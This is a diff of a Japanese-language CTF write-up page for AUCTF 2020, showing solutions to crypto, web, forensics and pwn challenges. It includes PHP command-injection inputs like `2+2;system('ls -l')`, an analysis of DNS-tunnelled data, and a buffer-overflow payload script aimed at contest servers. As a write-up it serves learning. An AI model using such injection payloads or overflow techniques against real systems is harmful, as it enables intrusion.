@@ -16,14 +16,14 @@
 <meta name="apple-mobile-web-app-status-bar-style" content="#f8f5ec">
 
 
-<meta name="author" content="CaptureAmerica @ CTF フラxxグゲット" /><meta name="description" content="(2020/04/11 - 復習しました) URL: https://ctf.auburn.edu/challenges チャレンジ数が多かった！！ 時間が足りない。 Bashの問題 (Over The Wire みたいなやつ)とか、いろいろ面白いチャレンジもありました" /><meta name="keywords" content="CTF, Writeup, captureamerica, picoCTF" />
+<meta name="author" content="CaptureAmerica @ CTF フラxxグゲット" /><meta name="description" content="(2020/04/11 - 復習しました) URL: https://ctf.auburn.edu/challenges チャレンジ数が多かった！！ 時間が足りない。 Bashの問題 ([Over The Wire](https://overthewire.org/wargames/) みたいなやつ)とか、いろいろ面白いチャレンジもありました" /><meta name="keywords" content="CTF, Writeup, captureamerica, picoCTF" />
 
 
 
 <meta name="google-site-verification" content="PqctLWZQttGzxXVupWuIt2HWuBI8cvN1z07ETpxA2dw" />
 
 
-<meta name="generator" content="Hugo 0.59.1 with theme even" />
+<meta name="generator" content="Hugo 0.68.3 with theme even" />
 
 
 <link rel="canonical" href="https://captureamerica.github.io/writeups/post/auctf_2020/" />
@@ -39,25 +39,22 @@
 
 
 <meta property="og:title" content="AUCTF 2020 Writeup" />
-<meta property="og:description" content="(2020/04/11 - 復習しました) URL: https://ctf.auburn.edu/challenges チャレンジ数が多かった！！ 時間が足りない。 Bashの問題 (Over The Wire みたいなやつ)とか、いろいろ面白いチャレンジもありました" />
+<meta property="og:description" content="(2020/04/11 - 復習しました) URL: https://ctf.auburn.edu/challenges チャレンジ数が多かった！！ 時間が足りない。 Bashの問題 ([Over The Wire](https://overthewire.org/wargames/) みたいなやつ)とか、いろいろ面白いチャレンジもありました" />
 <meta property="og:type" content="article" />
 <meta property="og:url" content="https://captureamerica.github.io/writeups/post/auctf_2020/" />
 <meta property="article:published_time" content="2020-04-06T13:00:00+09:00" />
 <meta property="article:modified_time" content="2020-04-11T17:00:00+09:00" />
 <meta itemprop="name" content="AUCTF 2020 Writeup">
-<meta itemprop="description" content="(2020/04/11 - 復習しました) URL: https://ctf.auburn.edu/challenges チャレンジ数が多かった！！ 時間が足りない。 Bashの問題 (Over The Wire みたいなやつ)とか、いろいろ面白いチャレンジもありました">
-
-
+<meta itemprop="description" content="(2020/04/11 - 復習しました) URL: https://ctf.auburn.edu/challenges チャレンジ数が多かった！！ 時間が足りない。 Bashの問題 ([Over The Wire](https://overthewire.org/wargames/) みたいなやつ)とか、いろいろ面白いチャレンジもありました">
 <meta itemprop="datePublished" content="2020-04-06T13:00:00&#43;09:00" />
 <meta itemprop="dateModified" content="2020-04-11T17:00:00&#43;09:00" />
-<meta itemprop="wordCount" content="6457">
+<meta itemprop="wordCount" content="6417">
 
 
 
-<meta itemprop="keywords" content="CTF,Reviewed," />
-<meta name="twitter:card" content="summary"/>
+<meta itemprop="keywords" content="CTF,Reviewed," /><meta name="twitter:card" content="summary"/>
 <meta name="twitter:title" content="AUCTF 2020 Writeup"/>
-<meta name="twitter:description" content="(2020/04/11 - 復習しました) URL: https://ctf.auburn.edu/challenges チャレンジ数が多かった！！ 時間が足りない。 Bashの問題 (Over The Wire みたいなやつ)とか、いろいろ面白いチャレンジもありました"/>
+<meta name="twitter:description" content="(2020/04/11 - 復習しました) URL: https://ctf.auburn.edu/challenges チャレンジ数が多かった！！ 時間が足りない。 Bashの問題 ([Over The Wire](https://overthewire.org/wargames/) みたいなやつ)とか、いろいろ面白いチャレンジもありました"/>
 
 <!--[if lte IE 9]>
   <script src="https://cdnjs.cloudflare.com/ajax/libs/classlist/1.1.20170427/classList.min.js"></script>
@@ -139,168 +136,154 @@
   <h2 class="post-toc-title">Contents</h2>
   <div class="post-toc-content">
     <nav id="TableOfContents">
-<ul>
-<li>
-<ul>
-<li><a href="#cryptography-pretty-ridiculous">[Cryptography]: Pretty Ridiculous</a>
-<ul>
-<li><a href="#challenge">Challenge</a></li>
-<li><a href="#solution">Solution</a></li>
-</ul></li>
-<li><a href="#web-miyazaki-trivia">[Web]: Miyazaki Trivia</a>
-<ul>
-<li><a href="#challenge-1">Challenge</a></li>
-<li><a href="#solution-1">Solution</a></li>
-</ul></li>
-<li><a href="#web-quick-maths">[Web]: Quick Maths</a>
-<ul>
-<li><a href="#challenge-2">Challenge</a></li>
-<li><a href="#solution-2">Solution</a></li>
-</ul></li>
-<li><a href="#web-gg-no-re">[Web]: gg no re</a>
-<ul>
-<li><a href="#challenge-3">Challenge</a></li>
-<li><a href="#solution-3">Solution</a></li>
-</ul></li>
-<li><a href="#forensics-block2">[Forensics]: Block2</a>
-<ul>
-<li><a href="#challenge-4">Challenge</a></li>
-<li><a href="#solution-4">Solution</a></li>
-</ul></li>
-<li><a href="#forensics-animal-crossing">[Forensics]: Animal Crossing</a>
-<ul>
-<li><a href="#challenge-5">Challenge</a></li>
-<li><a href="#solution-5">Solution</a></li>
-</ul></li>
-<li><a href="#pwn-thanksgiving-dinner">[Pwn]: Thanksgiving Dinner</a>
-<ul>
-<li><a href="#challenge-6">Challenge</a></li>
-<li><a href="#solution-6">Solution</a></li>
-</ul></li>
-<li><a href="#bash-bash-2">[Bash]: Bash 2</a>
-<ul>
-<li><a href="#challenge-7">Challenge</a></li>
-<li><a href="#solution-7">Solution</a></li>
-</ul></li>
-<li><a href="#bash-bash-3">[Bash]: Bash 3</a>
-<ul>
-<li><a href="#challenge-8">Challenge</a></li>
-<li><a href="#solution-8">Solution</a></li>
-</ul></li>
-<li><a href="#bash-bash-4">[Bash]: Bash 4</a>
-<ul>
-<li><a href="#challenge-9">Challenge</a></li>
-<li><a href="#solution-9">Solution</a></li>
-</ul></li>
-<li><a href="#bash-bash-5">[Bash]: Bash 5</a>
-<ul>
-<li><a href="#challenge-10">Challenge</a></li>
-<li><a href="#solution-10">Solution</a></li>
-</ul></li>
-<li><a href="#osint-good-old-days">[OSINT]: Good Old Days</a>
-<ul>
-<li><a href="#challenge-11">Challenge</a></li>
-<li><a href="#solution-11">Solution</a></li>
-</ul></li>
-<li><a href="#sequence-can-you-seeda-sequence">[Sequence]: Can You SeeDa Sequence</a>
-<ul>
-<li><a href="#challenge-12">Challenge</a></li>
-<li><a href="#solution-12">Solution</a></li>
-</ul></li>
-<li><a href="#password-cracking-salty">[Password Cracking]: Salty</a>
-<ul>
-<li><a href="#challenge-13">Challenge</a></li>
-<li><a href="#solution-13">Solution</a></li>
-</ul></li>
-<li><a href="#password-cracking-zippy">[Password Cracking]: Zippy</a>
-<ul>
-<li><a href="#challenge-14">Challenge</a></li>
-<li><a href="#solution-14">Solution</a></li>
-</ul></li>
-<li><a href="#password-cracking-manager">[Password Cracking]: Manager</a>
-<ul>
-<li><a href="#challenge-15">Challenge</a></li>
-<li><a href="#solution-15">Solution</a></li>
-</ul></li>
-<li><a href="#forensics-fahrenheit-451">[Forensics]: Fahrenheit 451</a>
-<ul>
-<li><a href="#challenge-16">Challenge</a></li>
-<li><a href="#solution-16">Solution</a></li>
-</ul></li>
-</ul></li>
-</ul>
+  <ul>
+    <li><a href="#cryptography-pretty-ridiculous">[Cryptography]: Pretty Ridiculous</a>
+      <ul>
+        <li><a href="#challenge">Challenge</a></li>
+        <li><a href="#solution">Solution</a></li>
+      </ul>
+    </li>
+    <li><a href="#web-miyazaki-trivia">[Web]: Miyazaki Trivia</a>
+      <ul>
+        <li><a href="#challenge-1">Challenge</a></li>
+        <li><a href="#solution-1">Solution</a></li>
+      </ul>
+    </li>
+    <li><a href="#web-quick-maths">[Web]: Quick Maths</a>
+      <ul>
+        <li><a href="#challenge-2">Challenge</a></li>
+        <li><a href="#solution-2">Solution</a></li>
+      </ul>
+    </li>
+    <li><a href="#web-gg-no-re">[Web]: gg no re</a>
+      <ul>
+        <li><a href="#challenge-3">Challenge</a></li>
+        <li><a href="#solution-3">Solution</a></li>
+      </ul>
+    </li>
+    <li><a href="#forensics-block2">[Forensics]: Block2</a>
+      <ul>
+        <li><a href="#challenge-4">Challenge</a></li>
+        <li><a href="#solution-4">Solution</a></li>
+      </ul>
+    </li>
+    <li><a href="#forensics-animal-crossing">[Forensics]: Animal Crossing</a>
+      <ul>
+        <li><a href="#challenge-5">Challenge</a></li>
+        <li><a href="#solution-5">Solution</a></li>
+      </ul>
+    </li>
+    <li><a href="#pwn-thanksgiving-dinner">[Pwn]: Thanksgiving Dinner</a>
+      <ul>
+        <li><a href="#challenge-6">Challenge</a></li>
+        <li><a href="#solution-6">Solution</a></li>
+      </ul>
+    </li>
+    <li><a href="#bash-bash-2">[Bash]: Bash 2</a>
+      <ul>
+        <li><a href="#challenge-7">Challenge</a></li>
+        <li><a href="#solution-7">Solution</a></li>
+      </ul>
+    </li>
+    <li><a href="#bash-bash-3">[Bash]: Bash 3</a>
+      <ul>
+        <li><a href="#challenge-8">Challenge</a></li>
+        <li><a href="#solution-8">Solution</a></li>
+      </ul>
+    </li>
+    <li><a href="#bash-bash-4">[Bash]: Bash 4</a>
+      <ul>
+        <li><a href="#challenge-9">Challenge</a></li>
+        <li><a href="#solution-9">Solution</a></li>
+      </ul>
+    </li>
+    <li><a href="#bash-bash-5">[Bash]: Bash 5</a>
+      <ul>
+        <li><a href="#challenge-10">Challenge</a></li>
+        <li><a href="#solution-10">Solution</a></li>
+      </ul>
+    </li>
+    <li><a href="#osint-good-old-days">[OSINT]: Good Old Days</a>
+      <ul>
+        <li><a href="#challenge-11">Challenge</a></li>
+        <li><a href="#solution-11">Solution</a></li>
+      </ul>
+    </li>
+    <li><a href="#sequence-can-you-seeda-sequence">[Sequence]: Can You SeeDa Sequence</a>
+      <ul>
+        <li><a href="#challenge-12">Challenge</a></li>
+        <li><a href="#solution-12">Solution</a></li>
+      </ul>
+    </li>
+    <li><a href="#password-cracking-salty">[Password Cracking]: Salty</a>
+      <ul>
+        <li><a href="#challenge-13">Challenge</a></li>
+        <li><a href="#solution-13">Solution</a></li>
+      </ul>
+    </li>
+    <li><a href="#password-cracking-zippy">[Password Cracking]: Zippy</a>
+      <ul>
+        <li><a href="#challenge-14">Challenge</a></li>
+        <li><a href="#solution-14">Solution</a></li>
+      </ul>
+    </li>
+    <li><a href="#password-cracking-manager">[Password Cracking]: Manager</a>
+      <ul>
+        <li><a href="#challenge-15">Challenge</a></li>
+        <li><a href="#solution-15">Solution</a></li>
+      </ul>
+    </li>
+    <li><a href="#forensics-fahrenheit-451">[Forensics]: Fahrenheit 451</a>
+      <ul>
+        <li><a href="#challenge-16">Challenge</a></li>
+        <li><a href="#solution-16">Solution</a></li>
+      </ul>
+    </li>
+  </ul>
 </nav>
   </div>
 </div>
     <div class="post-content">
-      
-
-<div class='align-right'>
-  
+      <div class='align-right'>
 <a href="https://translate.google.com/translate?hl=en&sl=auto&tl=en&u=https%3A%2F%2Fcaptureamerica.github.io%2Fwriteups%2Fpost%2Fauctf_2020%2F">
 <img src="https://captureamerica.github.io/writeups/img/En.png" alt="English">
 </a>
-
 </div>
-
 <p>(2020/04/11 - 復習しました)</p>
-
-<p>URL: <a href="https://ctf.auburn.edu/challenges" target="_blank">https://ctf.auburn.edu/challenges</a>
+<p>URL: <a href="https://ctf.auburn.edu/challenges">https://ctf.auburn.edu/challenges</a>
 <br /><br />
 チャレンジ数が多かった！！ 時間が足りない。</p>
-
-<p><br>
-Bashの問題 (<a href="https://overthewire.org/wargames/" target="_blank">Over The Wire</a> みたいなやつ)とか、いろいろ面白いチャレンジもありました。</p>
-
+<br>
+Bashの問題 ([Over The Wire](https://overthewire.org/wargames/) みたいなやつ)とか、いろいろ面白いチャレンジもありました。
 <p>Password Cracking はもう少し解きたかったなぁ。。
 <br /><br /></p>
-
-<p><img src="https://captureamerica.github.io/writeups/img/auctf_2020_Score1.png" alt="auctf_2020_Score1.png"></p>
-
-<p><img src="https://captureamerica.github.io/writeups/img/auctf_2020_Score2.png" alt="auctf_2020_Score2.png"></p>
-
-<p><img src="https://captureamerica.github.io/writeups/img/auctf_2020_Score3.png" alt="auctf_2020_Score3.png"></p>
-
+<img src="https://captureamerica.github.io/writeups/img/auctf_2020_Score1.png" alt="auctf_2020_Score1.png">
+<img src="https://captureamerica.github.io/writeups/img/auctf_2020_Score2.png" alt="auctf_2020_Score2.png">
+<img src="https://captureamerica.github.io/writeups/img/auctf_2020_Score3.png" alt="auctf_2020_Score3.png">
 <p><br /></p>
-
-<p><img src="https://captureamerica.github.io/writeups/img/auctf_2020_Chall1.png" alt="auctf_2020_Chall1.png"></p>
-
-<p><img src="https://captureamerica.github.io/writeups/img/auctf_2020_Chall2.png" alt="auctf_2020_Chall2.png"></p>
-
-<p><img src="https://captureamerica.github.io/writeups/img/auctf_2020_Chall3.png" alt="auctf_2020_Chall3.png"></p>
-
-<p><img src="https://captureamerica.github.io/writeups/img/auctf_2020_Chall4.png" alt="auctf_2020_Chall4.png"></p>
-
+<img src="https://captureamerica.github.io/writeups/img/auctf_2020_Chall1.png" alt="auctf_2020_Chall1.png">
+<img src="https://captureamerica.github.io/writeups/img/auctf_2020_Chall2.png" alt="auctf_2020_Chall2.png">
+<img src="https://captureamerica.github.io/writeups/img/auctf_2020_Chall3.png" alt="auctf_2020_Chall3.png">
+<img src="https://captureamerica.github.io/writeups/img/auctf_2020_Chall4.png" alt="auctf_2020_Chall4.png">
 <p><br /><br /></p>
-
 <h2 id="cryptography-pretty-ridiculous">[Cryptography]: Pretty Ridiculous</h2>
-
-<hr />
-
+<hr>
 <h3 id="challenge">Challenge</h3>
-
 <blockquote>
 <p>Eve discovered that a piece of paper had been shoved into her pocket.. what could it be? The message she found can be downloaded at the following link:
 <br /><br />
 (n,e) = (627585038806247, 65537)</p>
 </blockquote>
-
 <p>Attachment:</p>
-
 <ul>
 <li>message.txt</li>
 </ul>
-
 <table><tr><td bgcolor="#f8f5ec">
 [145213650433152, 4562349440334, 24272724667960, 598242834066721, 89584939111364, 426756492371444, 511701778613016, 551732685650248, 296367799892003, 63113462897284, 198510931603899, 321201931522255, 401044612595398, 542697603423052, 213898535689643, 275839755798105, 185841409622217, 551732685650248, 121188708737752, 401044612595398, 512808963720303, 275839755798105, 198510931603899, 275839755798105, 401044612595398, 174484844253615, 551732685650248, 174486913717420, 575163265381617, 213898535689643, 401044612595398, 49103824223436, 551732685650248, 401044612595398, 598242834066721, 202722428784490, 306606077829794, 53801100921263, 401044612595398, 184805755675232, 405971446461049, 296367799892003, 275839755798105, 275839755798105, 401044612595398, 358054299396778, 4562349440334, 320837325468842, 401044612595398, 202722428784490, 551732685650248, 321201931522255, 228350651363859]
 </td></tr></table>
-
 <p><br /></p>
-
 <h3 id="solution">Solution</h3>
-
-<p>1個ずつRsaCtfTool.pyで解きます。trコマンドを使ってmessage.txtの &quot;,&quot; を &quot;\n&quot; に変換してcipher.txtとして保存しておきました。</p>
-
+<p>1個ずつRsaCtfTool.pyで解きます。trコマンドを使ってmessage.txtの &ldquo;,&rdquo; を &ldquo;\n&rdquo; に変換してcipher.txtとして保存しておきました。</p>
 <pre>
 $ for c in $(cat cipher.txt); do ~/Python3/RsaCtfTool/RsaCtfTool.py -n 627585038806247 -e 65537 --uncipher $c ; done
 
@@ -359,80 +342,54 @@ $ for c in $(cat cipher.txt); do ~/Python3/RsaCtfTool/RsaCtfTool.py -n 627585038
 [+] Clear text : b'\x00\x00\x00\x00\x00\x00y'
 [+] Clear text : b'\x00\x00\x00\x00\x00\x00}'
 </pre>
-
 <p><br />
 結果を rsa_result.txt として保存（エラーの行は削除）して、後ろから2文字目だけを取り出します。</p>
-
 <pre>
 $ cat rsa_result.txt | rev | cut -c 2 | tr -d "\n" ; echo
 auctf{R34lLy_Pr1M3s_w1L1_n3vEr_b3_thI5_Sm411_BuT_h3y}
 </pre>
-
 <p><br />
 Flag: <code>auctf{R34lLy_Pr1M3s_w1L1_n3vEr_b3_thI5_Sm411_BuT_h3y}</code></p>
-
 <p><br /><br />
 <br /><br /></p>
-
 <h2 id="web-miyazaki-trivia">[Web]: Miyazaki Trivia</h2>
-
-<hr />
-
+<hr>
 <h3 id="challenge-1">Challenge</h3>
-
 <blockquote>
-<p><a href="http://challenges.auctf.com:30020" target="_blank">http://challenges.auctf.com:30020</a>
+<p><a href="http://challenges.auctf.com">http://challenges.auctf.com</a>:30020
 <br /><br />
-Here's a bit of trivia for you vidya game nerds.</p>
+Here&rsquo;s a bit of trivia for you vidya game nerds.</p>
 </blockquote>
-
 <p><br /></p>
-
 <h3 id="solution-1">Solution</h3>
-
 <p>robots.txtにアクセスすると、以下が書かれています。</p>
-
 <table><tr><td bgcolor="#f8f5ec">
 VIDEO GAME TRIVIA: What is the adage of Byrgenwerth scholars? MAKE a GET request to this page with a header named 'answer' to submit your answer.
 fear the old blood. but master willem
 </td></tr></table>
-
 <p><br />
 adage についていろいろ調べて試したところ、<code>Fear the Old Blood</code>が正解みたいです。</p>
-
 <pre>
 $ curl -H "answer:Fear the Old Blood" http://challenges.auctf.com:30020/robots.txt
 Master Willem was right.auctf{f3ar_z_olD3_8l0oD}
 </pre>
-
 <p><br />
 Flag: <code>auctf{f3ar_z_olD3_8l0oD}</code></p>
-
 <p><br /><br />
 <br /><br /></p>
-
 <h2 id="web-quick-maths">[Web]: Quick Maths</h2>
-
-<hr />
-
+<hr>
 <h3 id="challenge-2">Challenge</h3>
-
 <blockquote>
-<p><a href="http://challenges.auctf.com:30021" target="_blank">http://challenges.auctf.com:30021</a>
+<p><a href="http://challenges.auctf.com">http://challenges.auctf.com</a>:30021
 <br /><br />
-two plus two is four minus three that's one quick maths</p>
+two plus two is four minus three that&rsquo;s one quick maths</p>
 </blockquote>
-
 <p><br /></p>
-
 <h3 id="solution-2">Solution</h3>
-
 <p>Webにアクセスすると、テキストボックスがあって、そこで計算をしてくれるようです。</p>
-
 <p><code>2+2;phpinfo()</code> を試したところ、phpinfoが取れました。</p>
-
 <p>そこで、<code>2+2;system('ls -l')</code> を試したところ、以下が取れました。</p>
-
 <pre>
 4total 264
 -rwxr-xr-x 1 www-data www-data 130736 Apr 4 09:09 date
@@ -440,51 +397,34 @@ two plus two is four minus three that's one quick maths</p>
 -rwxr-xr-x 1 www-data www-data 130736 Apr 4 09:09 ls
 -rw-r--r-- 1 www-data www-data 6 Apr 4 09:02 test.txt
 </pre>
-
 <p><br />
 どうやら、date, lsはELFファイルで、おそらく他の人のテストによって生成されちゃったファイル。</p>
-
 <p>test.txtも関係ないファイルでした。</p>
-
 <p>index.phpの中にフラグがあると予想して、<code>2+2;system(&quot;grep ctf index.php&quot;)</code> でフラグを取りました。</p>
-
 <p><br />
 Flag: <code>auctf{p6p_1nj3c7i0n_iz_k3wl}</code></p>
-
 <p><br /><br />
 <br /><br /></p>
-
 <h2 id="web-gg-no-re">[Web]: gg no re</h2>
-
-<hr />
-
+<hr>
 <h3 id="challenge-3">Challenge</h3>
-
 <blockquote>
-<p><a href="http://challenges.auctf.com:30022" target="_blank">http://challenges.auctf.com:30022</a>
+<p><a href="http://challenges.auctf.com">http://challenges.auctf.com</a>:30022
 <br /><br />
 A junior dev built this site but we want you to test it before we send it to production.</p>
 </blockquote>
-
 <p><br /></p>
-
 <h3 id="solution-3">Solution</h3>
-
 <p>ページのソースを見ると、以下のjsファイルが見つかります。</p>
-
-<p><a href="http://challenges.auctf.com:30022/authentication.js" target="_blank">http://challenges.auctf.com:30022/authentication.js</a></p>
-
+<p><a href="http://challenges.auctf.com">http://challenges.auctf.com</a>:30022/authentication.js</p>
 <p><br /><br />
 authentication.jsの中にbase64でエンコードされた箇所があるので、とりあえずデコードしてみます。</p>
-
 <pre>
 $ echo "TWFrZSBhIEdFVCByZXF1ZXN0IHRvIC9oaWRkZW4vbmV4dHN0ZXAucGhw" | base64 -d
 Make a GET request to /hidden/nextstep.php
 </pre>
-
 <p><br /><br />
 言われた通り /hidden/nextstep.php にブラウザでアクセスしてみるも、特に何も見つからなかったので <code>curl -v</code> でアクセスしました。</p>
-
 <pre>
 $ curl http://challenges.auctf.com:30022/hidden/nextstep.php -v
 *   Trying 157.245.252.113:30022...
@@ -510,18 +450,14 @@ $ curl http://challenges.auctf.com:30022/hidden/nextstep.php -v
 * Connection #0 to host challenges.auctf.com left intact
 Howdy neighbor!
 </pre>
-
 <p><br /><br />
 受け取ったBase64文字列をデコードします。</p>
-
 <pre>
 $ echo TWFrZSBhIFBPU1QgcmVxdWVzdCB0byAvYXBpL2ZpbmFsLnBocA== | base64 -d
 Make a POST request to /api/final.php
 </pre>
-
 <p><br /><br />
 フラグゲットです。</p>
-
 <pre>
 $ curl -X POST -d flag http://challenges.auctf.com:30022/api/final.php
 auctf{1_w@s_laZ_w1t_dis_0N3} 
@@ -529,80 +465,54 @@ auctf{1_w@s_laZ_w1t_dis_0N3}
 $ curl -d flag http://challenges.auctf.com:30022/api/final.php
 auctf{1_w@s_laZ_w1t_dis_0N3}
 </pre>
-
 <p><br />
 Flag: <code>auctf{1_w@s_laZ_w1t_dis_0N3}</code></p>
-
 <p><br />
 ＃ところで、チャレンジ名の <code>gg no re</code> はどういう意味なんでしょうね。そっちの方がナゾです。</p>
-
 <p><br /><br />
 <br /><br /></p>
-
 <h2 id="forensics-block2">[Forensics]: Block2</h2>
-
-<hr />
-
+<hr>
 <h3 id="challenge-4">Challenge</h3>
-
 <blockquote>
 <p>Billy runs a minecraft server. He wants to know which block was rolled back. Can you help him?
 <br /><br />
 NONSTANDARD FLAG FORMAT: Insert the unix timestamp of the row into auctf{time_stamp}</p>
 </blockquote>
-
 <p>Attachment:</p>
-
 <ul>
 <li>co_block.sql.gz</li>
 </ul>
-
-<p>ファイルの中身の抜粋。
+<p>ファイルの中身の抜粋。</p>
 <pre>
-INSERT INTO <code>co_block</code> (<code>rowid</code>, <code>time</code>, <code>user</code>, <code>rolled_back</code>, <code>wid</code>, <code>x</code>, <code>y</code>, <code>z</code>, <code>type</code>, <code>data</code>, <code>meta</code>, <code>blockdata</code>, <code>action</code>) VALUES
-(612512,    1581375173, 3,  0,  1,  612,    5,  1757,   2,  0,  NULL,   '43',   1),
-(612513,    1581375173, 3,  0,  1,  610,    5,  1759,   2,  0,  NULL,   '43',   1),
-</pre></p>
-
+INSERT INTO `co_block` (`rowid`, `time`, `user`, `rolled_back`, `wid`, `x`, `y`, `z`, `type`, `data`, `meta`, `blockdata`, `action`) VALUES
+(612512,	1581375173,	3,	0,	1,	612,	5,	1757,	2,	0,	NULL,	'43',	1),
+(612513,	1581375173,	3,	0,	1,	610,	5,	1759,	2,	0,	NULL,	'43',	1),
+</pre>
 <p><br /></p>
-
 <h3 id="solution-4">Solution</h3>
-
 <p>INSERT INTO の行から、各Columnの意味がわかります。<code>time</code>と<code>rolled_back</code>だけに注目したらよさそうです。</p>
-
 <pre>
 $ grep '^(' co_block.sql | cut -d, -f2,4 | grep 1$
-    1581060905, 1
+	1581060905,	1
 </pre>
-
 <p><br />
 Flag: <code>auctf{1581060905}</code></p>
-
 <p><br /><br />
 <br /><br /></p>
-
 <h2 id="forensics-animal-crossing">[Forensics]: Animal Crossing</h2>
-
-<hr />
-
+<hr>
 <h3 id="challenge-5">Challenge</h3>
-
 <blockquote>
 <p>While looking for the Animal Crossing Nintendo Switch you find weird traffic on your network. Investigate.</p>
 </blockquote>
-
 <p>Attachment:</p>
-
 <ul>
 <li>animalcrossing.pcapng</li>
 </ul>
-
 <p><br /></p>
-
 <h3 id="solution-5">Solution</h3>
-
 <p>pcapにいろいろ含まれていますが、<code>weird traffic</code> と言えばDNSが明らかに怪しいです。</p>
-
 <pre>
 $ tshark -r animalcrossing.pcapng dns | grep "A " | grep -v AAAA | grep -v response | grep -v "org."
    36   2.250193   10.1.1.103 → 10.1.1.10    DNS 140 Standard query 0x0006 A RGlkIHlvdSBldmVyIGhlYXIgdGhlIHRyYWdlZHkgb2YgRGFydGggUGxhZ.ad.quickbrownfoxes.org
@@ -625,58 +535,41 @@ $ tshark -r animalcrossing.pcapng dns | grep "A " | grep -v AAAA | grep -v respo
   274   2.552026   10.1.1.103 → 10.1.1.10    DNS 140 Standard query 0x0006 A 25pYy4gSGUgY291bGQgc2F2ZSBvdGhlcnMgZnJvbSBkZWF0aCwgYnV0IG.ad.quickbrownfoxes.org
   684  11.324828   10.1.1.103 → 10.1.1.10    DNS 74 Standard query 0xe9db A www.odrive.com
 </pre>
-
 <p>（最後のwww.odrive.comは無視します。）</p>
-
 <p><br />
-名前のところだけ取り出します。
+名前のところだけ取り出します。</p>
 <pre>
-$ tshark -r animalcrossing.pcapng dns | grep &quot;A &quot; | grep -v AAAA | grep -v response | grep -v &quot;org.&quot; | awk '{print $12}' | cut -d. -f1 | tr -d &quot;\n&quot;
-</pre></p>
-
+$ tshark -r animalcrossing.pcapng dns | grep "A " | grep -v AAAA | grep -v response | grep -v "org." | awk '{print $12}' | cut -d. -f1 | tr -d "\n"
+</pre>
 <p><br /></p>
-
 <p>base64でデコードするとフラグが見つかります。</p>
-
 <table><tr><td bgcolor="#f8f5ec">
 Did you ever hear the tragedy of Darth Plagueis The Wise? I thought not. It’s not a story the Jedi would tell you. It’s a Sith legend. Darth Plagueis was a Dark Lord of the Sith, so powerful and so wise he could use the Force to influence the midichlorians to create life… <font color="red">auctf{it_was_star_wars_all_along}</font> He had such a knowledge of the dark side that he could even keep the ones he cared about from dying. The dark side of the Force is a pathway to many abilities some consider to be unnatural. He became so powerful… the only thing he was afraid of was losing his power, which eventually, of course, he did. Unfortunately, he taught his apprentice everything he knew, then his apprentice killed him in his sleep. Ironic. He could save others from death, but base64: invalid input
 </td></tr></table>
-
 <p><br />
 Flag: <code>auctf{it_was_star_wars_all_along}</code></p>
-
 <p><br /><br />
 <br /><br /></p>
-
 <h2 id="pwn-thanksgiving-dinner">[Pwn]: Thanksgiving Dinner</h2>
-
-<hr />
-
+<hr>
 <h3 id="challenge-6">Challenge</h3>
-
 <blockquote>
-<p>I just ate a huge dinner. I can barley eat anymore... so please don't give me too much!
+<p>I just ate a huge dinner. I can barley eat anymore&hellip; so please don&rsquo;t give me too much!
 <br /><br />
 nc challenges.auctf.com 30011
 <br /><br />
 Note: ASLR is disabled for this challenge</p>
 </blockquote>
-
 <p>Attachment:</p>
-
 <ul>
 <li>turkey (ELF 32bit)</li>
 </ul>
-
 <p><br /></p>
-
 <h3 id="solution-6">Solution</h3>
-
 <p>Ghidraでソースを確認します。</p>
-
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code class="language-c" data-lang="c"><span class="lnt"> 1
+<pre class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -752,20 +645,15 @@ Note: ASLR is disabled for this challenge</p>
 <span class="p">}</span></code></pre></td></tr></table>
 </div>
 </div>
-
-<p><br>
-fgets()の箇所でlocal_30に入力ができますが、バッファのサイズ16バイトにも関わらず、36バイト（0x24）読み込むようになっています。</p>
-
+<br>
+fgets()の箇所でlocal_30に入力ができますが、バッファのサイズ16バイトにも関わらず、36バイト（0x24）読み込むようになっています。
 <p>ここで、その他のローカル変数を任意の値に書き換えられます。</p>
-
 <p>if文の条件に合うように値をセットしたら、print_flag()でフラグが表示されます。</p>
-
-<p><br>
-<code>(local_14 &lt; -0x14)</code> の判定が少しわかりにくいですが、ここはアセンブラで見た方がわかりやすいかもです。</p>
-
+<br>
+`(local_14 < -0x14)` の判定が少しわかりにくいですが、ここはアセンブラで見た方がわかりやすいかもです。
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code class="language-c" data-lang="c"><span class="lnt"> 1
+<pre class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -803,17 +691,14 @@ fgets()の箇所でlocal_30に入力ができますが、バッファのサイ�
    <span class="mh">0x56556315</span> <span class="o">&lt;+</span><span class="mi">197</span><span class="o">&gt;:</span>	<span class="n">ret</span>   </code></pre></td></tr></table>
 </div>
 </div>
-
-<p><br>
-<code>0xffffffec</code> との比較をしているので、<code>0xffffffeb</code> か <code>0xffffffed</code> のどちらかで行けるでしょう（笑）</p>
-
+<br>
+`0xffffffec` との比較をしているので、`0xffffffeb` か `0xffffffed` のどちらかで行けるでしょう（笑）
 <p>（<code>0xffffffeb</code> が正解でした。)</p>
-
-<p><br>
-ということで、書いたコードです。</p>
+<br>
+ということで、書いたコードです。
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code class="language-Python" data-lang="Python"><span class="lnt"> 1
+<pre class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -858,34 +743,26 @@ fgets()の箇所でlocal_30に入力ができますが、バッファのサイ�
 <span class="n">s</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
 
 <span class="n">msg</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">recvall</span><span class="p">()</span>
-<span class="k">print</span><span class="p">(</span><span class="n">msg</span><span class="p">)</span></code></pre></td></tr></table>
+<span class="k">print</span><span class="p">(</span><span class="n">msg</span><span class="p">)</span>
+</code></pre></td></tr></table>
 </div>
-</div>
-<p><br></p>
-
+</div><br>
 <p>Flag: <code>auctf{I_s@id_1_w@s_fu11!}</code></p>
-
 <p><br /><br />
 <br /><br /></p>
-
 <h2 id="bash-bash-2">[Bash]: Bash 2</h2>
-
-<hr />
-
+<hr>
 <h3 id="challenge-7">Challenge</h3>
-
 <blockquote>
 <p>ssh challenges.auctf.com -p 30040 -l level2
 <br /><br />
 password is the flag of the previous Bash challenge</p>
 </blockquote>
-
